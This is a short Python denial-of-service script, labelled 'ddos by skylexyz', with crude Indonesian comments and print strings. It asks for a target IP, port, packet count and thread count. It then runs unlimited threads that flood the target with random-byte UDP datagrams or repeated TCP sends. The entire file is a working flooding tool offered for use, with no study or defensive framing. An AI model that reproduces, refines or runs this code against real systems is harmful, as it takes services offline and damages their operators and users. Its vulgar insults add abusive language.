#mau remake izin dulu ya sayang
import random
import socket
import threading
import os

os.system("clear")
print("ddos by skylexyz")
print("anda tau memek?")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" serang?(gass/gakjadi): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("attack ","attack ","attack "))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"ddos by skylexyz!!!!!!! skylexyz anak haram babi!!")
    except:
      print("hmm down!!!")

def run2():
  data = random._urandom(16)
  i = random.choice(("attack ","attack ","attack "))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" oi kiyomasa")
    except:
      s.close()
      print("[*] Down")

for gass in range(threads):
  if choice == 'gass':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
